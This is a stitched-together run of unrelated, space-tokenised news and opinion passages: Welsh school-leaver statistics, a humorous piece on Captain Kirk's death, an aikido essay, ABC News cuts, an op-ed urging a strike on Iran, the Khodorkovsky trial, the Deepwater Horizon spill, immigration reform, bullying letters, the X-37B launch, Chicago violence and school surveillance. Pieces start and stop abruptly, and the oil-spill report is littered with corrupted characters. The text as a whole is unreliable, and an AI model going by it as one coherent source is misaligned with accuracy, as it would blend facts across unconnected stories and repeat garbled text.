The survey showed that , as in previous years , a larger proportion of girls than boys chose to continue in full - time education .
The difference is most marked in year 11 , with over 6 % more girls than boys .
Over the last five years , a slight rise has been recorded every year in the percentage of girls and boys choosing this route in year 11 and 12 .
Year 13 figures have been slightly more erratic , according to Careers Wales , but there has been a definite increase in the last three years .
There also continues to be a higher percentage of boys than girls in the not in education , employment or training ( NEET ) category in years 11 , 12 and 13 .
The difference is most marked in year 13 with more than 2 % more boys in this category .
Those in part - time education – 16 hours or less per week – were previously included in the NEET category , but this year are recorded separately .
It also showed that the percentage of boys entering the labour market , either work - based training or employment , continues to be higher than the number of girls across the three cohorts .
Welsh education expert Professor David Reynolds said it was a surprise to see the slight dip in higher education applicants , although that figure has “ gone through the roof ” this year , with record numbers of teenagers wanting to go to university in 2010 .
On the differences between the sexes , Prof Reynolds of Plymouth University said : “ The gender gap is a worldwide phenomenon , not just a UK or Welsh one . ”
He said that the poorer performance of boys at school , resulting in many leaving the education system sooner than their female counterparts , is the culmination of girls being given a fairer chance to succeed .
“ Boys have suffered as girls have done well , ” said Prof Reynolds .
“ Girls have come through strongly and boys have found it increasingly difficult to compete .
“ There are probably other issues at work as well – the growth of an anti-schools sub-culture is something that seems to have hap - pened , particularly among boys exposed to the labour market . ”
There is also a problem for boys in the way pupils are assessed now , with continuous assessment suiting girls ’ organisational skills and males traditionally doing better in final exams , he says .
However , he stressed that the positives of mixed - sex classrooms outweigh the negatives .
Instead of splitting the sexes , Prof Reynolds said schools can take a more targeted approach to the way they teach boys and girls in order to keep male classroom members engaged in education .
“ Policies at whole - school level which ensure boys get organised , ” he said .
“ Some schools have even handed out Filofaxes for them to become better organised . ”
A Welsh Assembly Government spokeswoman said : “ We are actively encouraging boys to stay on in education in Wales .
Our 14 - 19 Learning Pathways policy focuses on the needs of the learner by offering a wide range of courses , including vocational provision , to allow young people to achieve their full potential .
“ The learner support provided by the Learning Coach function will also help young people to overcome any barriers to their learning and will help keep them engaged in education .
“ We recognise there are sometime financial barriers when young people are deciding whether to stay on in education .
Education Maintenance Allowances are a financial and educational incentive to young people from low - income households to encourage them to remain in , or return to , education .
“ Research conducted in England indicates the EMA scheme is most effective and beneficial for young people from groups that are traditionally associated with lower levels of achievement , including male learners . ”
But occasionally you see a character die in an abrupt , pointless way that seemed to have been written in as an afterthought , or even in such an undignified way that you suspect the writers included it as a " screw you " to the actor .
Death scenes are the kind of thing actors drool over .
If your character has to bite it , you want to go out like William Wallace , dammit !
FREEEEDOOOOM !!!
5 Capt. James T. Kirk

William Shatner played the same character for 28 years , and inspired something like a religion .
Somewhere , right now , a grown man is dressed in a Captain Kirk uniform , probably while in a crowded room next to some other guy dressed like a Klingon .
So how did they send off the star of one of the most popular and lucrative franchises in entertainment history ?

The Death :
They dropped a bridge on him .
After decades of ( sometimes shirtlessly ) tangling with the universe 's biggest baddies and boning the hottest aliens , Kirk leaves the mortal coil by way of subpar building construction codes .
While watching Star Trek : Generations we knew something was wrong when , during a face - off with the movie 's main bad guy with Captain Picard , Kirk tells Picard to hold off the bad guy for him .
James T. Kirk passing the chance to punch a dude ?
That 's like a heroin addict saying , " Man , can you shoot up my stash for me ?
I got an errand to run . "

So instead Kirk goes to fetch a remote to disable the cloak on a bunch of missiles Soran ( the bad guy ) was about to launch .
The remote just so happens to be on a rickety bridge and , as Kirk manages to make a final act of disabling the cloaking system , the bridge collapses down a cliff , taking Kirk with it .
What Really Happened :
First of all , it 's clear that Kirk was shoehorned into the film only because the suits were n't confident they could get people to watch a Kirk - less Star Trek movie ( Leonard Nimoy and DeForest Kelley both refused to be in the movie , saying the crew got a perfectly good sendoff in The Undiscovered Country , a film specifically written for that purpose ) .
Then , when the writers were sitting around brainstorming ideas for , you know , what to actually do with him , somebody said , " Why do n't we kill Kirk ? " ( yes , that 's literally what they said ) .
About the author : Penny Bernath , a 6th degree black belt , teaches the martial art of aikido .
She is also an educator who created KidVisionVPK , an online teaching tool for teachers .
Fort Lauderdale , Florida ( CNN ) --
In the beginning , it was a secret .
Inspired by a television program on abused women , I snuck out with my sister to find a martial arts school for myself .
I had told my husband at the time that I was interested in finding a martial arts class .
" That 's for men , " my first husband said , " and you are not very physically active anyway . "
But I was 20 years old and inspired .
I later became frustrated with many martial arts and self - defense classes that I found .
At the point of attack , the victim is taught to instantly transform into a crazed aggressor by kicking , striking and screaming .
This is unrealistic , particularly for a woman who is n't aggressive by nature .
So I gravitated toward aikido , a defensive martial art that taught me to work with -- instead of against -- my nature .
Aikido works by blending with an attack and redirecting it away .
Learning how to remain calm and centered in the face of an attack helps me just as much in my everyday life as it does in aikido .
Martial arts as a way to a balanced life
In aikido , practice requires two people who take turns attacking and defending .
You learn on a very physical level to treat others as you would like to be treated .
If someone is rough , you tend to be rough .
If someone is easy , you are easy .
In life , a smile begets a smile .
With each new partner , you have to establish a relationship of trust , usually without speaking , often without knowing anything about that person or where he or she comes from .
Watch how you can deal with an attack
This exercise has helped me in my professional life as a mentor to teachers .
When I walk into a classroom to observe a teacher , I generally do n't know anything about her .
It is best for me if she feels relaxed and does what she knows how to do .
My part requires eye contact , body language and a positive , noninvasive presence .
Martial arts are both physically and mentally empowering , helping me as a mother , wife , professional and student .
I am expected to accept responsibilities , resolve conflicts , and keep others safe .
Understanding that my strength comes through maintaining control , I feel empowered that I can do so in daily life .
Overcoming adversity
Facing adversity is another lesson from martial arts .
As the attacker , you must give a committed strike and then you have to trust your partner .
You must stay centered and in control , yet at the same time let go and let the movement take you .
In aikido practice , as in life , you commit to an attack or plan of action , follow through , absorb the energy of others , and accept the consequences of the action with a positive learning attitude .
Knowing that I can take whatever comes my way at the dojo has made me able to accept and move on from personal disasters .
I was laid off after 20 years of working my way up the ladder to an executive position at a private university .
It was devastating to lose not only my job , but my passion .
I felt physically thrown on the mat , but I knew I had to get back up , just as I do every time I practice aikido .
When you fall down , you must get up and practice again with renewed insight .
Eventually it led me to a new career that allowed me to continue to follow my passion by contributing to the overall good of preschool teachers , parents and children .
You must also learn how to deal with more than one attacker , which is called " randori " in aikido .
During randori , the attackers come one right after the other .
I must center myself , stay low to the ground , focus on the moment at hand , complete each technique , and try to create a synchronized energy with the group .
It is just like dealing with a hectic life .
When my children were younger , my second husband , Peter , and I were busy growing our aikido dojo , practicing often and traveling all over the world to pursue our training .
At the same time , we had to take my son to his all - star Little League baseball games and my daughter to her baton practice , which she did competitively .
I had all these things going on , and then I had to go back to work full time .
Then I realized I wanted to go back to school .
I did .
My life was full , but I stayed centered and focused -- just like dealing with more than one attacker .
The connection between the lessons I continue to learn on the mat and conducting my daily life are extraordinary .
Aikido has taught me how to be calm and centered though physical practice and to move confidently and follow through with ideas I believe in .
5 tips for choosing a martial arts program
• Make sure the location of the dojo , and the day and time of classes easily fit into your schedule .
• The school and its teaching staff should be credentialed with a larger organization .
• The style and form of the martial art should suit your personality .
• Find out whether the price fits your budget .
• Watch a class .
Do you feel comfortable and welcome ?
Is there a positive relationship between the teacher and students ?
If not , you might want to find another program .
As part of the deep cuts announced this week at ABC News , the network plans to close all of its physical bureaus around the country except Washington and halve the number of its domestic correspondents .
ABC News President David Westin confirmed in an interview Friday that the network 's ranks of bureau correspondents , which currently number several dozen , would be cut in half and be replaced with " digital " journalists who would be expected to shoot and edit their own stories .
“ We will have as many total journalists as we do now , ” he said .
Although the network will keep a minimal staff presence in Atlanta , Chicago , Dallas , Los Angeles , Miami and Boston , it will shut down its bricks - and - mortar bureaus there and ask its remaining employees to work from the local affiliates .
The Washington bureau will remain open , but its size will be substantially reduced .
[ Updated at 1:10 p.m. : Kate O'Brian , ABC 's senior vice president of news , said that although the network eventually plans to shut down its physical bureaus in the long term , it is still examining all of its leases and is not going to immediately vacate all offices .
The news division has not yet approached affiliates about housing network correspondents , but has found that model works in Denver and Detroit . ]
The mood was grim in Los Angeles , the largest bureau outside of Washington .
The 40 - plus staffers were told this week that only a few producers would remain and only two correspondents would be assigned to cover the West , down from a total of six who work out of Dallas , Seattle , San Francisco and Los Angeles .
Many functions that had been done out of the bureau will be handled by a “ logistics desk ” in New York .
Demoralized employees , who did not want to be quoted by name for fear of losing their jobs , said the severity of the cuts would make it nearly impossible to swarm major stories such as the perennial wildfires in Southern California .
Laundry workers rally in Perth Amboy for COVID - 19 protections
Dozens of laundry workers gathered on Tuesday in the city to demand greater protections against COVID - 19 and a new union contract .
On Easter Sunday , I was able to sit in prayer for a while at the Shrine run by sweet Italian nuns on top of the Mountain of the Beatitudes , the most famous of Sermons .
It was infinitely peaceful , and I needed it .
Later it hit me :
What if the mad leader of Iran fulfilled his pledge to wipe Israel from the map with the Iranian nuclear weapon , coming soon ?
What would we Christians do without the Mount of the Sermon ?
Without Capernaum ?
Without Nazareth ?
Without Cana ?
Without the lovely and mystical city of Jerusalem without Golgotha , and the Mount of Olives , the Garden of Gethsemane , and the Tomb ?
Without Bethlehem ?
Without the Sea of Tiberius ( the Sea of Galilee ) , where Jesus after his Resurrection had Peter and the others cast their net on the other side of their boat ?
Back in the 1940s , when Reinhold Niebuhr started Christianity in Crisis to support the war against Nazism , he abandoned his earlier pacifism , and his earlier too - simply pious way of wishing evil away , and called for a new tough - minded Christian realism .
He rooted this realism in the writings of St. Augustine on the observable presence of sin wherever men live and act  even in the courts of law , even in marriage , to name two of the better human institutions .
Augustine voiced the awful conclusion that there will always be wars , despite the pious dreams of many .
For wars flow from the inner heart of the City of Man , its egotism , pride , ambition , and other sins that is , distorted acts of all kinds .
Because he rooted his new political realism in his own theological conversion his new meditation on the wisdom and trustworthy observations of Augustine Niebuhr called the new movement he called for by the theological name , Renewed Orthodoxy or Neo-Orthodoxy .
We again need such Christian realism .
Such tough - mindedness .
The most dreadful war of all time is just ahead of us , is already well begun .
Many of us want to save the Christian Holy Places , and Israel , tooour best ally in the world , the creator of the most economically creative and democratic society in its region .
Fulfilling this desire will not be easy in the next twelve months , fateful months , clock - ticking months .
If the nuclear capacity of Iran is not destroyed before functioning nuclear weapons are in their silos or other weapons platforms , the whole world will experience blackmail .
To make an object lesson , one nation in particular is on notice that it is listed as first for destruction .
How will we live with ourselves if Israel is annihilated with nuclear bombs ?
How will we survive ?
How will our understanding of the Word of God survive , if the fleshly , tangible heart of Jewish and Christian faith is obliterated ?
Yes , we need a new , tough Christian Renewal of Orthodoxy , Neo-Orthodoxy , Christian realism .
We face tough actions in the next month and the months after .
In the next month , because Congress is about to work out a reconciliation of its two strong bills ( in the Senate and in the House ) setting in place very threatening sanctions against Irans capacity to function .
That bill then will go to the desk of President Obama , who may or may not sign it .
Great pressure will have to be exerted , life - or - death pressure , to guarantee that that bill is signed .
Our future depends on it .
If sanctions do not work , it will not be moral simply to take the easy road of allowing the Iranians to outwit us and outlast us .
They intend to go ahead with their mad scheme .
They calculate that we lack the moral strength to stop them .
Who is ready to say that as the last of all resorts the Iranian nuclear effort must be destroyed by force before it comes to term ?
I for one do say it .
Maybe some can show that Christian realism , Neo-Orthodoxy , can be satisfied by an easier path .
I do not think so , but I am open to argument .
What are the reasons against ?
What are the reasons for ?
We do not have much time to wait before getting that argument going .
We must get it done soon , in order to be able to act in time .
What is at stake is whether any future Christians will be able to sit and pray where Our Lord Jesus once preached the unforgettable Sermon .
And much else besides .
Mikhail K contemplates life in the cage
HANDCUFFED to his prison guard , Mikhail Khodorkovsky , once boss of the Russian oil giant Yukos , is greeted with spontaneous applause as he is escorted into a bulletproof glass cage with his former business partner , Platon Lebedev .
Since the second trial of the two men began a year ago , writers , actors , politicians , diplomats and journalists have all flocked to the small courtroom .
Now that Mr Khodorkovsky has begun to give evidence , the benches there have become the hottest seats in town .
To mark the occasion , two exhibitions have been staged in Moscow .
The latest , a surreal show of comic pictures , was mounted in a derelict factory with a façade resembling the wall of a prison ( see article ) .
Yet no art form can compare with the absurdity of reality .
Mr Khodorkovsky , already serving an eight - year sentence for underpaying tax on Yukos 's profits , is now charged with stealing the oil produced by his company .
The new case violates the principle of double jeopardy and also contradicts the first one .
Had Mr Khodorkovsky stolen all the oil , how could Yukos have recorded a big profit and underpaid tax ?
The lack of an injured party and of evidence that the oil ever went missing makes the second trial Kafkaesque .
The explanation may be simple , however .
Mr Khodorkovsky 's sentence runs out next year .
Those who put him in jail cannot afford to let him out , partly for political reasons and partly because they are worried that the property which they expropriated from Yukos is now the subject of international litigation .
To keep Mr Khodorkovsky in jail , the old charges have been repackaged into a new case that could keep him locked up for as long as another 22 years .
The political motives of the new case also explain its legal inadequacy .
The prosecutors have thrown every possible charge at Mr Khodorkovsky with little in the way of evidence .
Instead , they caricature the entire Yukos operation as illegal .
The indictment is vague , woolly and incoherent .
But this has made Mr Khodorkovsky 's defence stronger .
His detailed , page - by - page analysis of the indictment ( which can be read here ) demonstrates the legal nihilism of the prosecution .
Kirill Rogov , a political observer , has argued that this is now a courtroom where the prosecutors , not Mr Khodorkovsky , are on trial .
He speaks with the authority of a chief executive of what was once Russia 's largest oil company .
He explains how Yukos and Russia 's oil industry functioned , but he goes beyond business matters .
What he is defending is not his long - lost business , but his human rights .
The transformation of Mr Khodorkovsky from a ruthless oligarch , operating in a virtually lawless climate , into a political prisoner and freedom fighter is one of the more intriguing tales in post - communist Russia .
Good and bad oligarchs
The legacy of Mr Khodorkovsky 's oligarchic past is still evident in the ambivalent attitude revealed by opinion polls .
Few Russians believe that their courts are objective or that the destruction of Yukos has benefited anyone other than a small group of Kremlin cronies .
But only a quarter would like to see Mr Khodorkovsky set free .
Even so , the respect he now commands among Russia 's intellectual and business elite is a tribute both to the strength of his personal convictions and to the progress he has made since being arrested at gunpoint on a Siberian airport runway seven years ago .
His arrest and imprisonment were expected and could have been avoided .
After Vladimir Putin came to power as Russia 's president in 2000 , the choices offered to Russia 's oligarchs were clear : either submit to the Kremlin and join the ranks of its loyal friends ; or surrender your wealth and leave the country .
Unlike other oligarchs , Mr Khodorkovsky would not choose .
He decided to stay in Russia and defend his rights to property , dignity and independence .
His personal ambition was no longer satisfied by making money and building Russia 's most successful oil company .
He said he wanted a normal country too : one in which wealth and independence need not be mutually exclusive .
To this end , he fully disclosed his financial interests .
He openly financed different political parties , including some strongly opposed to the Kremlin .
He defended the independent media .
And he channelled his wealth into building a civil society in Russia .
It was these actions , says Lyudmila Alexeyeva , a veteran human - rights activist , that landed Mr Khodorkovsky in jail .
Having chosen this path , Mr Khodorkovsky has engaged in activities traditional for Russian dissidents and political prisoners .
He has written political articles , exchanged letters with Russian thinkers and writers , and commented on every significant event in the country .
“ He has not wasted those years in prison : he has read and thought a great deal , ” comments Ms Alexeyeva .
One of his exchanges cost him 12 days in solitary confinement , but more recently , his articles have been widely published without any immediate repercussions .
Some of his statements have stirred controversy — notably when he lambasted Russian liberals for their servility and when he argued for a greater role for the state in the economy ( which he contrasted with the Kremlin 's use of state functions in narrow commercial interests ) .
But his right to speak his mind was beyond dispute .
The person who is most irritated by Mr Khodorkovsky 's enhanced status is Mr Putin .
In a recent interview he went out of his way to compare Mr Khodorkovsky to Al Capone and implicate him in a murder in the 1990s of which he has never been formally accused .
Mr Putin 's crossness is understandable .
Mr Khodorkovsky 's arrest and trial became a defining moment of his presidency .
In this narrow sense , indeed , the imprisoned Mr Khodorkovsky might be compared to the exiled Andrei Sakharov in the 1980s .
Both Mr Khodorkovsky and Sakharov , an eminent nuclear physicist , chose a thorny path .
And both of these one - time political prisoners then , in effect , took their persecutors and jailers hostage .
Just as Mikhail Gorbachev 's talk of perestroika , opening up and new thinking , rang hollow until the moment when he allowed Sakharov to come home , so any talk by the Kremlin of the rule of law or about modernisation will be puffery so long as Mr Khodorkovsky remains in jail .
A slow - motion environmental disaster may be in the making with the discovery Saturday that 42,000 gallons a day of crude oil is spewing from a well on the bottom of the Gulf of Mexico near where a huge drilling rig sank last week ï¿½ and it could be months before it 's stopped .
The spill , which a day earlier Coast Guard officials believed was contained within a 16 - square - mile area on the surface , now covers some 400 square miles ï¿½ slightly bigger than the city of Dallas ï¿½ and could grow as the well continues to leak , Rear Adm .
Mary Landry , commander of Coast Guard District 8 , said Saturday .
ï¿ ½This is a very serious spill , ï¿½ she said at a press conference , adding that governments of Texas , Louisiana , Alabama , Mississippi and Florida had been warned about the threat of oil coming ashore and invited to participate in the response .
Word of the expanding spill came as the Deep­water Horizon drilling rig was found capsized and lying on the sea floor about 1,500 feet northwest of the well , located roughly 40 miles off the coast of Louisiana .
The semi-submersible rig , which is owned and operated by Swiss - based Transocean and under lease to BP , sank Thursday morning after an apparent blowout late Tuesday night sent the facility up in flames .
Of the 126 on board at the time , 11 are still missing and presumed dead ; the rest were evacuated safely .
Friday evening , the Coast Guard suspended the search for the 11 workers amid growing signs they had perished in the initial blast .
Since then , attention has turned to the huge environmental cleanup effort and what Landry called a ï¿½very extensiveï¿½ investigation by the Coast Guard and U.S. Minerals Management Service into how the accident happened .
As part of that effort , robot submarines equipped with cameras have been deployed in recent days to survey the wreckage and ensure the well was no longer leaking oil .
The Coast Guard said it had not detected oil coming from the well Friday and assumed post - accident efforts to activate the blowout preventer ï¿½ a huge stack of valves sitting atop the wellhead on the sea floor ï¿½ had been successful .
But later trips by the remotely operated vehicles , called ROVs , discovered oil shooting from the end of the pipe - like riser that had connected the rig to the blowout preventer .
A second , smaller leak was found in a section of drill pipe near the wellhead .
That 21 - inch - diameter riser had become detached from the rig when it sank .
In the process , it was folded over at a 90 - degree angle just above the wellhead , which had the effect of kinking it like a garden hose and constraining the flow of oil from the well .
It now sits in a long , meandering mess on the ocean bottom .
This helps explains why oil was not initially thought to be seeping .
Challenging situation
It also highlights the challenges of trying to comb an accident scene nearly one mile below the surface of the water .
ï¿½In 5,000 feet of water , it does add some complexity , ï¿½ said Lars Herbst , region director of the Gulf of Mexico for the U.S. Minerals Management Service , the arm of the Interior Department that regulates offshore drilling in federal waters .
Doug Suttles , chief operaing officer for BP exploration and production , said while the Coast Guard works to clean up oil at the surface , the company has mobilized some 700 employees and contractors to figure out a solution for sealing the well at the sea floor .
The preferred option , he said , is still to find a way to engage the blowout preventer .
That fix , if it works , could be handled in a matter of days , he said .
But if that does n't work , the other option is to drill a deep ï¿½reliefï¿½ well into the damaged well and stem the flow of oil , though that option could take several months , Suttles acknowledged .
He said his team would spend the next several days trying to determine the best method .
So far , the cleanup effort has vacuumed more than 33,000 gallons of oily water mix from the surface of the Gulf of Mexico , Landry said .
No estimate was available about how much remained .
Also onboard the submerged rig is an estimated 700,000 gallons of diesel fuel that has not been retrieved .
Sidney Coffee , former chair of Louisiana 's Coastal Protection and Restoration Authority , said any oil can pose a threat to marine habitats , and she is watching the Deepwater Horizon situation .
ï¿
½But with the technology they have , they can usually get it under control pretty quickly .ï¿½
Rough seas , rain and winds temporarily halted the cleanup Saturday .
Storms produced waves 8 to 10 feet high , forcing the Coast Guard to call ashore five oil - skimming boats , three work barges and five planes involved in the efforts .
They will resume when the weather improves .

A broad coalition which includes the AFL - CIO , Change to Win and dozens of immigrants ’ rights , civil rights , community , religious and ethnic organizations and coalitions is mobilizing for a mass march on Washington D.C. on March 21 , to demand the passage of progressive immigration reform legislation .
“ Reform Immigration for America ” came together last spring after different labor groups reached an agreement on a legislative approach to comprehensive immigration reform .
In previous years labor had been split on the specific trade offs entailed in legislative packages .
Although all understood that a perfect bill could not be passed because of the need to make concessions so as to get some Republicans on board , some unions whose organizing strategy is focused heavily on immigrant workers , including SEIU , UNITE - HERE , United Farm Workers and FLOC , had been willing to accept the addition of a large guest worker program ( up to 400,000 slots per year ) as a trade off for the legalization of the 8.5 million or so undocumented workers thought to be in the country .
On the other hand , the AFL - CIO and several Change to Win unions were opposed to any legislation that included an increase in guest workers .
The solution agreed on in the spring of 2009 was that instead of authorizing large - scale new guest worker programs , Congress would create a special commission or task force , with union participation , which would assess the labor needs of the country and make recommendations on the issuance of all kinds of work related visas on an ongoing basis .
The agreement among the unions made it possible to create the Reform Immigration for America ( RI4A ) coalition , which developed a legislative wish list .
All year , RI4A and its member organizations have been engaged in intensive organizing and publicity efforts , most notably in churches around the country , which have held joint public events often involving their local congressional representatives .
The culmination of these organizing efforts has been legislation introduced by Congresspersons Solomon Ortiz ( D - TX ) and Luis Gutierrez ( D - IL ) , that incorporates almost all of the demands of RI4A .
The bill , HR 4321 is called “ Comprehensive Immigration Reform for America ’s Security and Prosperity Act of 2009 ” ( CIRASP ) and currently has 94 cosponsors in the House of Representatives .
Like all federal bills , you can read it at http://thomas.loc.gov.
However , nothing has happened yet in the Senate .
Last fall , Senator Charles Schumer ( D - NY ) , presented an outline of “ principles ” for a Senate bill .
These principles are considerably to the right of the Ortiz - Gutierrez bill , but would do the priority job of legalizing the undocumented , and do not propose a large new guest worker program .
It was expected that a bill with Schumer as chief sponsor would be presented last fall , but this did not happen .
Washington sources say Schumer and the Democratic leadership want the bill to be “ bipartisan ” , evidently to give the Democrats political cover .
Schumer has been negotiating with Senator Lindsey Graham ( R - SC ) .
The immigrants ’ rights movement very much wanted a bill to be passed last year , to minimize the extent to which it would become entangled in the 2010 election year demagogy .
Many are frustrated that President Obama did not push the issue but left it up to the initiative of Congress .
They fear that if a bill is not achieved by March , there will not be another chance , because the Democrats may be in a weaker position after the election .
There has been no letup in the anti-immigrant propaganda , and Republicans have introduced several anti-immigrant bills .
These would , among other things , force all employers to use E - Verify ( a highly unreliable electronic verification system whereby employers can check if employees are eligible to work in the United States ) for all employees , and strip U.S. citizenship from children born in the U.S.A. to undocumented parents .
Meanwhile , though Homeland Security Secretary Janet Napolitano has basically stopped the big , ugly factory raids that characterized the last Bush years , other kinds of immigration enforcement actions have increased .
The White House has reiterated its desire to see a comprehensive immigration reform bill passed .
News sources reported that last week , president Obama met with Senators Schumer and Graham to encourage them to come up with a bill .
Meanwhile , immigrants ’ rights activists are urging maximum participation in the March 21 demonstrations in Washington .
They stress that the better the turnout , the better the leverage on Congress and the White House .

Leviticus 19:33 - 34 ( NIV )
When an alien lives with you in your land , do not mistreat him .
The alien living with you must be treated as one of your native - born .
Love him as yourself , for you were aliens in Egypt .
Female - female aggression is indirect and involves slandering , taunting and ostracizing one vulnerable female target , which is what happened in the South Hadley , Mass . , tragedy .
Often , envy of a girl ’s beauty or brains , but just as often , the slightest difference ( whether someone is new , an immigrant from another country , or school ) will be seized upon by a female clique and treated as a high crime , an opportunity to tribally bond with one another  and as permission to torment the chosen outsider .

The writer is the author of “ Woman ’s Inhumanity to Woman . ”

To the Editor :
Statistics about the violence of “ mean girls ” do n’t tell the entire story .
Bullying consists not only of violence and the threat of violence , but it can be subtle , consisting of isolation , humiliation and making someone feel unwanted and friendless .
This type of bullying is insidious , and can most assuredly have the same effects as physical intimidation .
While I applaud the efforts of better education and earlier intervention in the schools , along with legislation to prohibit this type of behavior , I have not seen anything that will provide for serious consequences for those who commit the offenses .
Laws should be changed so that schools would have the ability to suspend students for their behavior and have the students ’ permanent records reflect their heinous actions , allowing colleges to take this facet of one ’s character into consideration .
If students and , more important , parents understand that bullies will have this stain on them into adulthood , perhaps they will take this issue more seriously , and parents will feel a pressing need to get involved .
The US regulator has charged both Mr Tourre – who remains on extended leave but has been cleared of any wrongdoing by the bank – and Goldman itself with actively misleading its own clients over the sale of a complex $ 1bn parcel of toxic derivatives tied to the downfall of the US housing market .
Clear , sunny skies are forecast for Cape Canaveral Wednesday , perfect weather for the launch of a new unmanned spacecraft and the dawn of an era .
Just do n’t expect the Air Force to tell you what that new era is .
For the first time , the service will launch the X - 37B Orbital Test Vehicle , a brand new , unmanned spacecraft to demonstrate the military ’s ability to fly into space , circle the globe for months on end , and return intact , only to fly again .
But whether the X - 37 space plane is merely showing off nearly two decades of research and development or is actually a precursor to militarizing the final frontier , is far from clear since the vehicle ’s payload is classified .
An Air Force official wo n’t even say when it will return to California or where it will land .
But it can “ loiter ” over the globe for more than nine months .

“ In all honesty , we do n’t know when it ’s coming back , ” said Gary Payton , deputy undersecretary for the Air Force ’s space programs , in a conference call with reporters Tuesday .
' Weaponization ' of space ?
Arms control advocates say it is pretty clearly the beginning of a “ weaponization of space ” – precursor to a precision global strike capability that would allow the US to hover for months at a time over anywhere it chose with little anyone could do about it .
“ The idea of being able to launch an unmanned research platform that can stay up there for months on end provides you with all kinds of capability , both military and civilian , ” says Chris Hellman , a policy analyst with the National Priorities Project , a budget watchdog in Northampton , Mass .
He believes the fact that it is an Air Force initiative may say something about what it will ultimately used to do .
And that may not sit well with others .
“ I can see where the prospect of having half a dozen of these things with unknown payloads circling overhead could be very troubling to people , ” Mr. Hellman says .
What the Air Force will say is that the X - 37 will demonstrate “ various experiments ” and allow “ satellite sensors , subsystems , components , and associated technology ” to be transported into space and back .
Officials say the vehicle could change the way the service operates by making space operations more “ aircraft like ” with a vehicle like the X - 37 able to take off and later land and then fly again .
When it returns , scientists will determine how many of its components survived the flight and how long it will take to get the craft back into the air .
The shorter the turnaround time , the better , since that would mean fewer X - 37s would have to be built , regardless of its ultimate mission .
If it takes a long time to get the bird back in the air , “ it will make this vehicle less attractive to us in the future , ” Mr. Payton said .
Many unknowns , including ultimate mission
Still , there are many unknowns .
And analysts who typically know about such things are left to shrug .
“ There does not seem to be a publicly acknowledged capability that this thing will lead to , ” says John Pike , director of globalsecurity.org , a national security research organization in Alexandria , Va .
“ If taken at face value , it seems to be simply to satisfy the idle curiosity of the scientific community . ”
Mr. Pike believes one of the inherent values of the X - 37 could be as a maneuverable satellite which could be used to look over China 's shoulder one day , yet evade any attempts to shoot it down .
On the other hand , says Pike , it could amount to nothing more than “ recreational engineering , ” borrowing a term from the magazine Scientific American .
“ What ’s a few hundred million dollars between friends ? ”
Whatever it is or represents , the Air Force likes it .
Air Force officials say they are already building another X - 37 spacecraft that it hopes to fly by 2011 .

Two Illinois lawmakers say violence has become so rampant in Chicago that the National Guard must be called in to help .
Chicago Democratic Reps. John Fritchey and LaShawn Ford made a public plea to Gov. Pat Quinn on Sunday to deploy troops .
The request comes amid a recent surge in violent crime , including a night last week that saw seven people killed and 18 wounded , mostly by gunfire .
Fritchey says Chicago has had 113 homicide victims this year .
He says the police department has done a commendable job , but its resources are stretched thin .
Chicago Police Supt . Jody
Weis says he appreciates the lawmakers ’ frustration and willingness to help , but doubts the National Guard is the best answer .
A message left for Quinn was n’t returned Sunday .

By James Stephenson
I graduated from Virginia 's public schooling system two years ago , but my memories of it are fresh .
After all , my little sister is still there .
Being a kid today sucks .
I could n't tell you if it sucks more or less than other generations because I was n't a part of them .
But I can tell you that the reasons why it sucks are new -- and about some of the unfair acts perpetrated in the name of education .
Unlike the webcam snoopers of Lower Merion school disctict , ours does n't have the money to buy every kid a laptop .
That will probably change soon ; the cost of laptops is plummeting .
If our school district ( and most school districts in the US ) do n't have a laptop for every child within the next five years , it'd be a surprise .
And when my school district gives out hardware , I 'm certain that the administrators would watch us with them if they could , just like the students at Harriton High School .
The thing to remember about the public schools of today is that students are treated worse than criminals .
Everyone is presumed guilty until proven innocent .
I remember the day they installed the cameras in my high school .
Everyone was surprised when we walked and saw them hanging ominously from the ceiling .
Everyone except me : I moved to rural Virginia from the wealthier and more heavily populated region of northern Virginia .
Cameras have watched me since middle school .
So I was n't surprised , just disappointed .
" What have we done ? " asked one of my friends .
It felt like the faculty was punishing us for something .
A common justification for cameras is that they make students safer , and make them feel more secure .
I can tell you from first hand experience that that argument is bullshit .
Columbine had cameras , but they did n't make the 15 people who died there any safer .
Cameras do n't make you feel more secure ; they make you feel twitchy and paranoid .
Some people say that the only people who do n't like school cameras are the people that have something to hide .
But having the cameras is a constant reminder that the school does not trust you and that the school is worried your fellow classmates might go on some sort of killing rampage .
Cameras are n't the worst of the privacy violations .
Staff perform random searches of cars and lockers .
Most of the kids know about locker searches because they see the administration going though their stuff in the hall .
But not everyone knows about the car searches , all the way out in the parking lot where administrators are n't likely to be observed .
( People do n't often bother to lock their cars , either ) .
My best friend found out about the car searches the hard way during our senior year .
They searched his car and found a stage sword in his trunk .
It was a harmless fake , the kind of sword that is used as a prop on stage .
My friend is a live - action role playing enthusiast , and he had planned on going to a friends house to fool around after school .
But the school has a zero tolerence policy on " weapons . "
He was expelled .
The school claimed that he had " recourse . "
He could have appealed his case -- to the same administration that had kicked him out .
But the injustice of it is is that he was kicked out first , and only then offered a hearing .
Guilty until proven innocent .
This could have easily have happened to me .
One time when I was still in middle school , I went on a camping trip with my scout troop .
As usual I packed my camping equipment in the same backpack I used for school .
Only when the weekend was over and I went back to school , I realized with horror that my pocket knife was still stuck in the bottom of my backpack .
If administrators had searched my bag , not only would I have been expelled , I could have been arrested .
The sad thing is that the school district I 've described is one of the better ones .
In northern Virginia , the measures are even more Draconian .
They have heavily - armed and - armored police officers roaming the halls .
Students undergo a mandatory security orientation during their first week of middle school .
In it , a police officer goes through the implements they carry at all times .
The police women who performed the demo I attended showed us how she was always wore a bulletproof vest , and carried handcuffs , cable - tie style restraints , a large knife , a can of mace , and a retractable steel baton .
" It 's nonlethal , kids , " she said .
" But you do n't want me to have to shatter your kneecaps with it . "
She also wore a pistol with exactly thirteen rounds : one in the chamber , 12 in the clip .
She could have taken out a terrorist or two ; which I guess that is what they were expecting some of us to be .
At the tender age of 12 , this made quite an impression of me , and I still remember the event clearly .
But these methods were useless in keeping me or any of my classmates safe .
They did n't stop the kid who flashed a gun at me , or the bully who took a swipe at me with a switchblade .
Some people say youngsters are more disrespectful than ever before .
But if you were in an environment where you were constantly being treated as a criminal , would you still be respectful ?
In high school , one of my favorite English teachers never had trouble with her students .
The students in her class were the most well behaved in the school -- even if they were horrible in other teachers ' classes .
We were well - mannered , addressed her as " Ma'am , " and stood when she entered the room .
Other teachers were astonished that she could manage her students so well , especially since many of them were troublemakers .
She accomplished this not though harsh discipline , but by treating us with respect and being genuinely hurt if we did not return it .
Being a kid of my generation is n't all bad .
